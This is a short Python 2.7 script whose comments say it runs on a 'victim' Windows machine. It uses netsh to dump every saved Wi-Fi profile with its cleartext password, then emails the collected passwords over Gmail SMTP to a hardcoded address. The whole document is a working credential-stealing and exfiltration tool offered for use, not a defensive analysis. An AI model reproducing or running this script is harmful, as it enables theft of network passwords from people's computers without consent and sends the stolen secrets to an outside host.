#!/usr/bin/python2.7
#copy the script to victim machine this scripts should run on victim side windows_host 
#get saved wifi password and send a gather information to the mail address mention in the script

import subprocess
import smtplib
import re

def send_mail(email,password,message):

	server = smtplib.SMTP("smtp.gmail.com",587)
	server.starttls()
	server.login(email,password)
	server.sendmail(email,email,message)
	server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command,shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)",networks)

result = ""
for network_name in network_names_list:
	command = "netsh wlan show profile %s key=clear"%network_name
	#to get each and every network saved in the system
	current_result = subprocess.check_output(command,shell=True)
	result = result + current_result


send_mail("user@mail.com","password",result)
